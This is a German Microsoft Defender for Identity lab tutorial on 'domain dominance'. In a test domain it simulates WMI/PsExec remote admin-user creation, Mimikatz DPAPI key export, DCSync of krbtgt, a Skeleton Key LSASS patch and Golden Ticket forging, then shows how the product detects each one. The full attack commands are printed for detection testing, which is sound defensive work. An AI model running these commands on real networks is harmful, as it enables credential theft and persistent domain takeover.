---
title: Playbook zur Microsoft Defender for Identity-Domänendominanz
description: Dieses Playbook zur Microsoft Defender for Identity-Domänendominanz beschreibt, wie Sie Domänendominanzangriffe zur Erkennung durch Defender for Identity simulieren.
keywords: ''
author: shsagir
ms.author: shsagir
manager: shsagir
ms.date: 10/26/2020
ms.topic: tutorial
ms.collection: M365-security-compliance
ms.service: azure-advanced-threat-protection
ms.reviewer: itargoet
ms.suite: ems
ms.openlocfilehash: 76b24811cab5453bb462ec7ebe2d5477e2b6c072
ms.sourcegitcommit: f434dbff577d9944df18ca7533d026acdab0bb42
ms.translationtype: HT
ms.contentlocale: de-DE
ms.lasthandoff: 11/03/2020
ms.locfileid: "93274932"
---
# <a name="tutorial-domain-dominance-playbook"></a>Tutorial: Playbook zu Domänendominanz

[!INCLUDE [Rebranding notice](includes/rebranding.md)]

Das letzte Tutorial in dieser vierteiligen Reihe zu [!INCLUDE [Product long](includes/product-long.md)]-Sicherheitswarnungen ist ein Playbook zur Domänendominanz. Das Lab zu [!INCLUDE [Product short](includes/product-short.md)]-Sicherheitswarnungen soll die Funktionen von **[!INCLUDE [Product short](includes/product-short.md)]** zum Identifizieren und Erkennen potenzieller Angriffe auf Ihr Netzwerk veranschaulichen. Mit diesem Lab wird erläutert, wie Sie die *diskreten* Erkennungen von [!INCLUDE [Product short](includes/product-short.md)] mit den *signaturbasierten* Funktionen von [!INCLUDE [Product short](includes/product-short.md)] testen. Die Tutorials umfassen keine erweiterten Verhaltenserkennungen und -warnungen von [!INCLUDE [Product short](includes/product-short.md)] auf Machine Learning-, Benutzer- oder Entitätsbasis. Diese Typen von Erkennungen und Warnungen sind in den Tests nicht enthalten, da sie eine Lernphase und echten Netzwerkdatenverkehr für bis zu 30 Tage erfordern. Weitere Informationen zu den einzelnen Tutorials dieser Reihe finden Sie unter [Tutorialübersicht: [!INCLUDE [Product short](includes/product-short.md)]-Sicherheitswarnungsumgebung](playbook-lab-overview.md).

Dieses Playbook stellt einige der Dienste für Bedrohungserkennungen und Sicherheitswarnungen von [!INCLUDE [Product short](includes/product-short.md)] in Bezug auf Domänendominanz vor. Dabei werden simulierte Angriffe durch allgemeine, reale und öffentlich verfügbare Hacker- und Angriffstools verwendet. Die behandelten Methoden werden normalerweise an diesem Punkt in der Abwehrkette gegen Cyberangriffe verwendet, um permanente Domänendominanz zu erzielen.

In diesem Tutorial simulieren Sie Versuche, eine permanente Domänendominanz zu erreichen, um so jede der [!INCLUDE [Product short](includes/product-short.md)]-Erkennungen für die folgenden gängigen Methoden überprüfen zu können:

> [!div class="checklist"]
>
> - Codeausführung von Remotestandorten
> - Datenschutz-API (Data Protection API, DPAPI)
> - Böswillige Replikation
> - Erstellen eines Diensts
> - Skeleton Key
> - Golden Ticket

## <a name="prerequisites"></a>Voraussetzungen

1. [Ein vollständiges [!INCLUDE [Product short](includes/product-short.md)]-Sicherheitswarnungslab](playbook-setup-lab.md)
     - Sie sollten die Setupanweisungen für die Testumgebung genau einhalten. Je genauer Ihr Lab dem vorgeschlagenen Labsetup entspricht, desto einfacher können Sie die [!INCLUDE [Product short](includes/product-short.md)]-Testverfahren befolgen.

2. [Fertigstellung des Lateral-Movement-Playbooks](playbook-lateral-movement.md)

## <a name="domain-dominance"></a>Domänendominanz

Während der Phase der Domänendominanz in der Abwehrkette gegen Cyberangriffe hat ein Angreifer bereits legitime Anmeldedaten für den Zugriff auf Ihren Domänencontroller erlangt. Der Zugriff des Angreifers auf Ihren Domänencontroller bedeutet, dass Ihrem Netzwerk Schäden jeglichen Ausmaßes zugefügt werden können. Vom unmittelbaren Schaden abgesehen, platzieren speziell die raffinierteren Angreifer gern zusätzliche *Versicherungsrichtlinien* in Umgebungen, die sie kompromittiert haben. Diese Angriffe gewährleisten, dass ein Angreifer auch nach der Erkennung seiner anfänglichen Gefährdungen und Aktionen noch über dauerhaften Zugang zu Ihrer Domäne verfügt, was die Wahrscheinlichkeit seines langfristigen Erfolgs erhöht.

### <a name="remote-code-execution"></a>Codeausführung von Remotestandorten

Codeausführung von Remotestandorten ist genau das, wonach es sich anhört. Angreifer schaffen sich eine Möglichkeit, remote Code für eine Ressource auszuführen, in diesem Fall für einen Domänencontroller. Wir werden versuchen, diese gängigen Tools zusammen zu verwenden, um Code von Remotestandorten auszuführen und permanenten Zugriff auf den Domänencontroller zu erlangen, um dann zu sehen, was [!INCLUDE [Product short](includes/product-short.md)] uns zeigt.

- Windows-Verwaltungsinstrumentation (WMI, Windows Management Instrumentation)
- PsExec von SysInternals

Versuchen Sie, mithilfe von WMI über die Befehlszeile einen Prozess lokal auf dem Domänencontroller zu erstellen, um einen Benutzer mit dem Namen „InsertedUser“ mit dem Kennwort pa$ $w0rd1 zu erstellen.

1. Öffnen Sie die im Kontext von *SamiraA* ausgeführte Befehlszeile auf dem **VictimPC** , und führen Sie den folgenden Befehl aus:

   ```dos
   wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
   ```

1. Fügen Sie jetzt den erstellten Benutzer der Gruppe „Administrators“ auf dem Domänencontroller hinzu:

   ```dos
   PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
   ```

    ![Verwenden der Codeausführung von Remotestandorten (PsExec), um der Administratorgruppe auf dem Domänencontroller den neuen Benutzer hinzuzufügen](media/playbook-dominance-psexec_addtoadmins.png)

1. Wechseln Sie zu **Active Directory-Benutzer und -Computer (ADUC)** auf **ContosoDC** , und suchen Sie den **InsertedUser**.

1. Klicken Sie mit der rechten Maustaste auf **Eigenschaften** , und überprüfen Sie die Mitgliedschaft.

    ![Anzeigen der Eigenschaften von „InsertedUser“](media/playbook-dominance-inserteduser_properties.png)

Als Angreifer haben Sie in Ihrer Testumgebung erfolgreich mithilfe von WMI einen neuen Benutzer erstellt. Sie haben auch mithilfe von PsExec den neuen Benutzer der Gruppe „Administrators“ hinzugefügt. Aus der Perspektive der Persistenz wurde eine weitere berechtigte, unabhängige Anmeldeinformation auf dem Domänencontroller erstellt. Neue Anmeldeinformationen bieten einem Angreifer permanenten Zugriff auf den Domänencontroller für den Fall, dass die vorherigen Anmeldeinformationen erkannt und entfernt wurden.

### <a name="remote-code-execution-detection-in-product-short"></a>Erkennung der Remotecodeausführung in [!INCLUDE [Product short](includes/product-short.md)]

Melden Sie sich beim [!INCLUDE [Product short](includes/product-short.md)]-Portal an, um zu überprüfen, welche Elemente unseres letzten simulierten Angriffs von [!INCLUDE [Product short](includes/product-short.md)] erkannt wurden:

![[!INCLUDE [Product short](includes/product-short.md)] bei der Erkennung der WMI-Remotecodeausführung](media/playbook-dominance-wmipsexecdetected.png)

[!INCLUDE [Product short](includes/product-short.md)] erkannte die WMI- und PsExec-Remotecodeausführung.

Aufgrund der Verschlüsselung für die WMI-Sitzung sind bestimmte Werte wie z.B. die eigentlichen WMI-Methoden oder das Ergebnis des Angriffs nicht sichtbar. Allerdings liefert die Erkennung dieser Aktionen durch [!INCLUDE [Product short](includes/product-short.md)] ideale Informationen, um Verteidigungsmaßnahmen zu ergreifen.

VictimPC, der Computer, sollte nie remote Code für die Domänencontroller ausführen.

Da [!INCLUDE [Product short](includes/product-short.md)] im Lauf der Zeit lernt, wer in welche Sicherheitsgruppen eingefügt wird, werden ähnliche verdächtige Aktivitäten in der Zeitachse als anomale Aktivitäten identifiziert. Da diese Testumgebung vor kurzem erstellt wurde und weiterhin in der Lernphase ist, wird diese Aktivität nicht als Warnung angezeigt. Das Erkennen der Änderung von Sicherheitsgruppen durch [!INCLUDE [Product short](includes/product-short.md)] kann durch Überprüfen der Aktivitätszeitachse festgestellt werden. Mit [!INCLUDE [Product short](includes/product-short.md)] können Sie auch Berichte zu allen Änderungen von Sicherheitsgruppen generieren, die Sie proaktiv per E-Mail erhalten können.

Greifen Sie im [!INCLUDE [Product short](includes/product-short.md)]-Portal mit dem Suchtool auf die Seite **Administrator** zu. Die [!INCLUDE [Product short](includes/product-short.md)]-Erkennung der Benutzereinfügung wird auf der Aktivitätszeitachse der Administratorgruppe angezeigt.

![Anzeigen des zur sensiblen Sicherheitsgruppe hinzugefügten Benutzers](media/playbook-dominance-admininserteduser.png)

### <a name="data-protection-api-dpapi"></a>Datenschutz-API (Data Protection API, DPAPI)

Die Datenschutz-API (Data Protection Application Programming Interface, DPAPI) wird von Windows verwendet, um von Browsern gespeicherte Kennwörter, verschlüsselte Dateien und andere sensible Daten sicher zu schützen. Domänencontroller enthalten einen Hauptschlüssel, der *alle* Geheimnisse auf mit einer Domäne verbundenen Windows-Computern entschlüsseln kann.

Mithilfe von **Mimikatz** versuchen wir, den Hauptschlüssel vom Domänencontroller zu exportieren.

1. Führen Sie den folgenden Befehl für den Domänencontroller aus:

   ```dos
   mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
   ```

    ![Verwendung von Mimikatz zum Exportieren des DPAPI-Sicherungsschlüssels aus Active Directory](media/playbook-dominance-dpapi_mimikatz.png)

1. Überprüfen Sie, ob die Hauptschlüsseldatei exportiert wurde. Informieren Sie sich über die erstellten DER-, PFX-, PVK- und KEY-Dateien in dem Verzeichnis, in dem Sie „mimikatz.exe“ ausgeführt haben. Kopieren Sie den veralteten Schlüssel aus der Befehlszeile.

Als Angreifer verfügen wir jetzt über den Schlüssel zum Entschlüsseln aller DPAPI-verschlüsselten Dateien / sensiblen Daten aus *allen* Computern in der Gesamtstruktur.

### <a name="dpapi-detection-in-product-short"></a>DPAPI-Erkennung in [!INCLUDE [Product short](includes/product-short.md)]

Jetzt überprüfen wir im [!INCLUDE [Product short](includes/product-short.md)]-Portal, ob [!INCLUDE [Product short](includes/product-short.md)] unseren DPAPI-Angriff erfolgreich erkannt hat:

![Von [!INCLUDE [Product short](includes/product-short.md)] erkannte DPAPI-Anforderung](media/playbook-dominance-dpapidetected.png)

### <a name="malicious-replication"></a>Böswillige Replikation

Böswillige Replikation ermöglicht einem Angreifer, Benutzerinformationen mithilfe der Domänenadministrator-Anmeldeinformationen (oder Äquivalentem) zu replizieren. Mit böswilliger Replikation kann ein Angreifer im Wesentlichen eine Anmeldeinformation zu stehlen. Natürlich ist das am meisten durch Angriffe zum Stehlen der Anmeldeinformationen gefährdete Konto „krbtgt“, da es der Hauptschlüssel zum Signieren aller Kerberos-Tickets ist.

Zwei gängige Hackertoolsets, die Angreifern böswillige Replikationsversuche ermöglichen, sind **Mimikatz** und **Impacket** von Core Security.

#### <a name="mimikatz-lsadumpdcsync"></a>Mimikatz lsadump::dcsync

Führen Sie auf **VictimPC** im Kontext von **SamirA** den folgenden Mimikatz-Befehl aus:

```dos
mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\temp\ContosoDC_krbtgt-export.txt
```

Wir haben die Informationen zum Konto „krbtgt“ hier repliziert: `c:\\temp\\ContosoDC_krbtgt-export.txt`

![Böswillige Replikation mittels Mimikatz](media/playbook-dominance-maliciousrep_mimikatz.png)

#### <a name="malicious-replication-detection-in-product-short"></a>Erkennung einer böswilligen Replikation in [!INCLUDE [Product short](includes/product-short.md)]

Überprüfen Sie im [!INCLUDE [Product short](includes/product-short.md)]-Portal, ob das Security Operations Center (SOC) die böswillige Replikation, die wir von VictimPC aus simuliert haben, erkannt hat.

![Böswillige Replikation wird durch [!INCLUDE [Product short](includes/product-short.md)] erkannt](media/playbook-dominance-maliciousrep_detected.png)

### <a name="skeleton-key"></a>Skeleton Key

Eine andere Domänendominanzmethode, die Angreifer verwenden, heißt **Skeleton Key**. Mit einem Skeleton Key, den der Angreifer erstellt hat, kann er sich *als beliebiger Benutzer* maskieren, und zwar *jederzeit*. Während eines Skeleton Key-Angriffs kann sich jeder Benutzer weiterhin mit seinem normalen Kennwort anmelden, aber jedes Konto erhält auch ein Masterkennwort. Neues Masterkennwort bzw. Skeleton Key ermöglichen jedem, der sie kennt, vollen Zugriff auf das Konto. Ein Skeleton Key-Angriff wird durch das Patchen des Prozesses „LSASS.exe“ auf dem Domänencontroller durchgeführt, wodurch die Benutzerauthentifizierung über eine herabgestufte Verschlüsselung erzwungen wird.

Wir verwenden einen Skeleton Key, um zu sehen, wie diese Art von Angriff funktioniert:

1. Verschieben Sie **mimikatz** mithilfe der **SamirA** -Anmeldeinformationen, die wir zuvor abgerufen haben, nach **ContosoDC**. Stellen Sie sicher, dass Sie die richtige Architektur von **mimikatz.exe** basierend auf dem Architekturtyp des DC (64-Bit bzw. 32-Bit) pushen. Führen Sie im **mimikatz** -Ordner Folgendes aus:

   ```dos
   xcopy mimikatz.exe \\ContosoDC\c$\temp
   ```

1. Da **mimikatz** nun auf dem DC bereitgestellt ist, führen Sie das Programm über PsExec remote aus:

   ```dos
   PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
   ```

1. Sie haben den LSASS-Prozess erfolgreich auf **ContosoDC** gepatcht.

    ![Skeleton Key-Angriff über mimikatz](media/playbook-dominance-skeletonkey.png)

### <a name="exploiting-the-skeleton-key-patched-lsass"></a>Ausnutzen des mit Skeleton Key gepatchten LSASS

Öffnen Sie auf **VictimPC** eine Cmd-Eingabeaufforderung (im Kontext von **JeffL** ), und führen Sie Folgendes aus, um zu versuchen, den Kontext von RonHD zu erhalten.

```dos
runas /user:ronhd@contoso.azure "notepad"
```

Wenn Sie aufgefordert werden, verwenden Sie absichtlich das falsche Kennwort. Diese Aktion weist nach, dass das Konto nach dem Ausführen des Angriffs *weiterhin* ein Kennwort hat.

![Verwendung eines *falschen* Kennworts nach dem Skeleton Key-Angriff (diese Methode funktioniert genau wie beschrieben)](media/playbook-dominance-skeletonkey_wrong.png)

Aber Skeleton Key fügt jedem Konto ein zusätzliches Kennwort hinzu. Führen Sie den Befehl „runas“ erneut aus, aber verwenden Sie dieses Mal „mimikatz“ als Kennwort.

```dos
runas /user:ronhd@contoso.azure "notepad"
```

Dieser Befehl erstellt einen neuen Prozess, *notepad* , der im Kontext von RonHD ausgeführt wird. **Skeleton Key kann für _alle_ Konten ausgeführt werden, inklusive Dienst- und Computerkonten.**

> [!Important]
> Es ist wichtig, dass Sie ContosoDC nach Ausführen des Skeleton Key-Angriffs neu starten. Wenn nicht, wird der Prozess „LSASS.exe“ auf ContosoDC gepatcht und geändert, sodass jede Authentifizierungsanforderung auf RC4 herabgestuft wird.

### <a name="skeleton-key-attack-detection-in-product-short"></a>Erkennung des Skeleton Key-Angriffs in [!INCLUDE [Product short](includes/product-short.md)]

Was hat [!INCLUDE [Product short](includes/product-short.md)] während des gesamten Vorgangs erkannt und gemeldet?

![Von [!INCLUDE [Product short](includes/product-short.md)] erkannter Skeleton Key-Angriff](media/playbook-dominance-skeletonkey_detected.png)

[!INCLUDE [Product short](includes/product-short.md)] hat erfolgreich die verdächtige Vorauthentifizierungs-Verschlüsselungsmethode erkannt, die für diesen Benutzer verwendet wurde.

### <a name="golden-ticket---existing-user"></a>Golden Ticket – vorhandener Benutzer

Nach dem Diebstahl eines „Golden Ticket“ (krbtgt-Konto, erläutert [hier im Abschnitt über böswillige Replikation](#malicious-replication)) kann ein Angreifer Tickets signieren, *als sei er der Domänencontroller*. **Mimikatz** , die Domänen-SID und das gestohlene „krbtgt“-Konto sind alle erforderlich, um diesen Angriff auszuführen. Wir können nicht nur Tickets für einen Benutzer generieren, sondern auch für Benutzer, die noch nicht vorhanden sind.

1. Führen Sie als JeffL den folgenden Befehl auf **VictimPC** aus, um die Domänen-SID abzurufen:

   ```dos
   whoami /user
   ```

    ![SID für Golden Ticket-Benutzer](media/playbook-dominance-golden_whoamisid.png)

1. Identifizieren und kopieren Sie die im obigen Screenshot hervorgehobene Domänen-SID.

1. Verwenden Sie in **mimikatz** die kopierte Domänen-SID zusammen mit dem gestohlenen NTLM-Hash des krbtgt-Benutzers zum Generieren des TGT. Fügen Sie den folgenden Text als JeffL in eine „cmd.exe“-Datei ein:

   ```dos
   mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
   ```

    ![Generieren des Golden Ticket](media/playbook-dominance-golden_generate.png)

   Der `/ptt`-Teil des Befehls ermöglichte uns, das generierte Ticket sofort dem Arbeitsspeicher zu übergeben.

1. Stellen Sie sicher, dass die Anmeldeinformationen sich im Arbeitsspeicher befinden.  Führen Sie `klist` in der Konsole aus.

    ![Klist-Ergebnisse nach dem Übergeben des generierten Tickets](media/playbook-dominance-golden_klist.png)

1. Führen Sie als Angreifer den folgenden Pass-the-Ticket-Befehl gegen den DC aus:

   ```dos
   dir \\ContosoDC\c$
   ```

   Gratulation, das Programm funktioniert! Sie haben ein **gefälschtes** Golden Ticket für SamiraA generiert.

    ![Ausführen des Golden Ticket über Mimikatz](media/playbook-dominance-golden_ptt.png)

Warum hat es funktioniert? Der Golden Ticket-Angriff funktioniert, da das generierte Ticket ordnungsgemäß mit dem Schlüssel „KRBTGT“ signiert wurde, den wir zuvor gestohlen haben. Dieses Ticket ermöglicht uns, als Angreifer Zugriff auf ContosoDC zu erlangen und uns einer Sicherheitsgruppe hinzuzufügen, die wir verwenden möchten.

#### <a name="golden-ticket--existing-user-attack-detection"></a>Golden Ticket – Erkennung des Angriffs auf einen vorhandenen Benutzer

[!INCLUDE [Product short](includes/product-short.md)] verwendet mehrere Methoden, um vermutete Angriffe dieses Typs zu erkennen. In genau diesem Szenario hat [!INCLUDE [Product short](includes/product-short.md)] die Herabstufung der Verschlüsselung des gefälschten Tickets erkannt.

![Golden Ticket wird erkannt](media/playbook-dominance-golden_detected.png)

> [!Important]
>Erinnerung. Solange das von einem Angreifer gestohlene KRBTGT in einer Umgebung gültig ist, bleiben die damit generierten Tickets auch gültig. In diesem Fall erreicht der Angreifer permanente Domänendominanz, bis [KRBTGT zweimal zurückgesetzt wird](/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).

## <a name="next-steps"></a>Nächste Schritte

- [Leitfaden für [!INCLUDE [Product short](includes/product-short.md)]-Sicherheitswarnungen](suspicious-activity-guide.md)
- [Untersuchen von Lateral Movement-Pfaden mit [!INCLUDE [Product short](includes/product-short.md)]](use-case-lateral-movement-path.md)
- [Weitere Informationen finden Sie im [!INCLUDE [Product short](includes/product-short.md)]-Forum.](https://aka.ms/MDIcommunity)

## <a name="join-the-community"></a>Beitritt zur Community

Haben Sie weitere Fragen, oder möchten Sie mit anderen über [!INCLUDE [Product short](includes/product-short.md)] und damit verbundene Sicherheitsaspekte diskutieren? Werden Sie Teil der [[!INCLUDE [Product short](includes/product-short.md)]Community](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection)!
